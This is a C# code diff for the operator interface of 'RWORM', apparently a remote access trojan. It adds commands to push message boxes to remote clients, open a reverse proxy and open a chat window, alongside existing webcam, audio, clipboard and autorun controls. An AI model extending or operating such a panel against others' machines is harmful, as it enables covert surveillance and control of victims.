@@ -169,6 +169,9 @@ namespace RWORM.GUI.ViewModels
         public ICommand OpenNetMonitorCommand      { get; }
         public ICommand OpenAutorunManagerCommand  { get; }
         public ICommand OpenClipboardManagerCommand { get; }
+        public ICommand OpenMessageBoxCommand       { get; }
+        public ICommand OpenReverseProxyCommand     { get; }
+        public ICommand OpenClientChatCommand       { get; }
         public ICommand OpenWebcamCommand           { get; }
         public ICommand OpenAudioCommand            { get; }
         public ICommand OpenUrlCommand              { get; }
@@ -250,6 +253,9 @@ namespace RWORM.GUI.ViewModels
             OpenNetMonitorCommand     = new RelayCommand(p => OpenNetMonitor(p as ClientModel));
             OpenAutorunManagerCommand = new RelayCommand(p => OpenAutorunManager(p as ClientModel));
             OpenClipboardManagerCommand = new RelayCommand(p => OpenClipboardManager(p as ClientModel));
+            OpenMessageBoxCommand       = new RelayCommand(p => OpenMessageBox(p as ClientModel));
+            OpenReverseProxyCommand     = new RelayCommand(p => OpenReverseProxy(p as ClientModel));
+            OpenClientChatCommand       = new RelayCommand(p => OpenClientChat(p as ClientModel));
             OpenWebcamCommand           = new RelayCommand(p => OpenWebcam(p as ClientModel));
             OpenAudioCommand            = new RelayCommand(p => OpenAudio(p as ClientModel));
             OpenUrlCommand              = new RelayCommand(p => PromptOpenUrl(p as ClientModel));
@@ -539,6 +545,35 @@ namespace RWORM.GUI.ViewModels
             var target = ResolveTargets(c).FirstOrDefault();
             if (target == null) return;
             new ClipboardManagerWindow(_server, target.Guid, target.Hostname).Show();
+        }
+
+        private void OpenMessageBox(ClientModel? c)
+        {
+            var targets = ResolveTargets(c);
+            if (targets.Count == 0) return;
+            var dlg = new MessageBoxDialog();
+            if (dlg.ShowDialog() == true)
+            {
+                foreach (var client in targets)
+                {
+                    _ = _server.ShowRemoteMessageBox(client.Guid, dlg.MsgTitle, dlg.MsgBody, dlg.ButtonsVal, dlg.IconVal);
+                }
+                StatusMessage = $"MessageBox sent to {targets.Count} client(s)";
+            }
+        }
+
+        private void OpenReverseProxy(ClientModel? c)
+        {
+            var target = ResolveTargets(c).FirstOrDefault();
+            if (target == null) return;
+            new ReverseProxyWindow(_server, target.Guid, target.Hostname).Show();
+        }
+
+        private void OpenClientChat(ClientModel? c)
+        {
+            var target = ResolveTargets(c).FirstOrDefault();
+            if (target == null) return;
+            new ClientChatWindow(_server, target.Guid, target.Hostname).Show();
         }
 
         private void OpenWebcam(ClientModel? c)
